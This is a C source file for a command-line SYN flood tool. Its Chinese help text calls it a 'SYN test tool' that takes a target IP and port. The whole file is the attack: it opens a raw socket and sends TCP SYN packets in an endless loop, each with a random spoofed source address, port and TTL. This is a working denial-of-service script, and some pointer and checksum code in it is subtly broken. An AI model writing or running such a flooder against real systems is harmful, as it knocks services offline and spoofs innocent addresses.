#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/ip.h>
#include <linux/tcp.h>
struct pstcphdr {
    __be32    saddr;
    __be32    daddr;
    __be16    proto;
    __be16    tcplen;
};
struct tcpoptions 
{
    __be32    mss;
    __be16    nop2;
    __be16    sack;
    __be32    scale;
};

unsigned short check_sum(unsigned short *addr,int len);

int main(int argc, char *argv[])
{
    if( argc == 1 )
    {
        printf("这是一个syn测试工具，命令格式./synflood ip port \n");
        exit(0);
    }
    else if( argc > 3 )
    {
        printf("参数输入太多啦，请不带参数查看输入格式！\n");
        exit(0);
    }
    else if( argc < 3 )
    {
        printf("参数输入太少啦，请不带参数查看输入格式！\n");
        exit(0);
    }
    const int on=1;
    /*char ipadd[20]=("192.168.1.10");*/
    srand(clock());
    /*struct sockaddr_in srcaddress;*/
    struct sockaddr_in dstaddress;
    struct pstcphdr *pstcphdr1;
    struct iphdr *iphead;
    struct tcphdr *tcp;
    struct tcpoptions *tcpopt;
    dstaddress.sin_family=AF_INET;
    dstaddress.sin_port=htons(atoi(argv[2]));
    dstaddress.sin_addr.s_addr = inet_addr(argv[1]);


    int sk=socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
    setsockopt(sk,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
    char buf[128]={0};
    int ip_len;

    ip_len = sizeof(*iphead)+sizeof(*tcp)+sizeof(*tcpopt);
    iphead=(struct iphdr*)buf;
    tcp=(struct tcphdr *)(buf+sizeof(*iphead));
    tcpopt=(struct tcpoptions*)(buf+sizeof(*iphead)+sizeof(*tcp));
    iphead->version= 4;
    iphead->ihl=sizeof(*iphead)/4;
    iphead->tos=0;
    iphead->tot_len=htons(ip_len);
    iphead->id=0;
    iphead->frag_off=0;
    iphead->protocol=6;
    iphead->check=0;
    inet_aton(argv[1],&iphead->daddr);

    int tcplen=sizeof(*tcp)+sizeof(*tcpopt);
    tcp->dest=htons(atoi(argv[2]));
    tcp->doff=tcplen/4;
    tcp->syn=1;
    tcp->check=0;
    tcp->window=htons(8196);

    tcpopt->mss=htonl(0x020405b4);
    tcpopt->nop2=htons(0x0101);
    tcpopt->sack=htons(0x0402);
    tcpopt->scale=htonl(0x01030309);

    pstcphdr1=(struct pstcphdr*)(buf+sizeof(*iphead)+sizeof(*tcp)+sizeof(*tcpopt));
    pstcphdr1->daddr=&iphead->daddr;
    pstcphdr1->proto=htons(6);
    pstcphdr1->tcplen=htons(sizeof(*tcp));
    while (1)
    {
        tcp->seq=rand();
        iphead->ttl=random()%98+30;
        iphead->saddr=htonl((rand()%3758096383));
        pstcphdr1->saddr=&iphead->saddr;
        tcp->source=htons(rand()%65535);
        tcp->check=check_sum((unsigned short*)tcp,sizeof(*tcp)+sizeof(*tcpopt)+sizeof(*pstcphdr1));

        sendto(sk,buf,ip_len,0,&dstaddress,sizeof(struct sockaddr_in));
    }
}

unsigned short check_sum(unsigned short *addr,int len){
    register int nleft=len;
    register int sum=0;
    register short *w=addr;
    short answer=0;

    while(nleft>1)
    {
        sum+=*w++;
        nleft-=2;
    }
    if(nleft==1)
    {
        *(unsigned char *)(&answer)=*(unsigned char *)w;
        sum+=answer;
    }

    sum=(sum>>16)+(sum&0xffff);
    sum+=(sum>>16);
    answer=~sum;
    return(answer);
}
